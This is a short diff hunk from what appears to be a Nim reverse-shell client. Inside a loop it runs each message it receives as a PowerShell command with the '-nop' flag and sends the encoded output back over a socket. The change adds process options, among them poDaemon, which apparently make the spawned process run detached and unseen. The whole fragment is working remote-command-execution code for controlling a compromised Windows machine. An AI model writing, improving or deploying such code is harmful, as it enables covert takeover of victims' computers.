@@ -163,7 +163,7 @@ while true:
   else:
     try:
       var command = message
-      var result = execProcess("powershell.exe -nop -c " & command)
+      var result = execProcess("powershell.exe -nop -c " & command,options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
       client.send(encode(result))
     except OSError:
       #echo "[-] An error occurred.. try again"
